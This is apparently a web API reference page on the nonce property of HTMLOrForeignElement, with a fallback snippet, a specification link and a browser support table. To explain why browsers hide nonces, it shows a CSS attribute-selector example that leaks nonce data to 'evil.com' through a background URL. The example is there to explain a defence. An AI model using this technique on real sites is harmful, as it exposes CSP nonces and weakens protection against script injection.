HTMLOrForeignElement.nonce
==========================

The `nonce` property of the [`HTMLOrForeignElement`](../htmlorforeignelement) mixin returns the cryptographic number used once that is used by [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) to determine whether a given fetch will be allowed to proceed.

In later implementations, elements only expose their `nonce` attribute to scripts (and not to side-channels like CSS attribute selectors).

Examples
--------

### Retrieving a nonce value

In the past, not all browsers supported the `nonce` IDL attribute, so a workaround is to try to use `getAttribute` as a fallback:

    let nonce = script['nonce'] || script.getAttribute('nonce');

However, recent browsers version hide `nonce` values that are accessed this way (an empty string will be returned). The IDL property (`script['nonce']`) will be the only way to access nonces.

Nonce hiding helps preventing that attackers exfiltrate nonce data via mechanisms that can grab data from content attributes like this:

    script[nonce~=whatever] {
      background: url("https://evil.com/nonce?whatever");
    }

Specifications
--------------

<table><thead><tr class="header"><th>Specification</th></tr></thead><tbody><tr class="odd"><td><a href="https://html.spec.whatwg.org/multipage/#attr-nonce">HTML Living Standard<br />
<span class="small">The definition of 'nonce' in that specification.</span></a></td></tr></tbody></table>

Browser compatibility
---------------------

Desktop

Mobile

Chrome

Edge

Firefox

Internet Explorer

Opera

Safari

WebView Android

Chrome Android

Firefox for Android

Opera Android

Safari on IOS

Samsung Internet

`nonce`

61

79

75

No

48

10

The property is defined only for its useful elements: `<link>`, `<script>`, and `<style>`; it is undefined for all other elements.

61

61

79

45

10

The property is defined only for its useful elements: `<link>`, `<script>`, and `<style>`; it is undefined for all other elements.

8.0

See also
--------

-   [`nonce` global attribute](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/nonce)
-   [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
-   CSP: [`script-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)

<a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLOrForeignElement/nonce" class="_attribution-link">https://developer.mozilla.org/en-US/docs/Web/API/HTMLOrForeignElement/nonce</a>
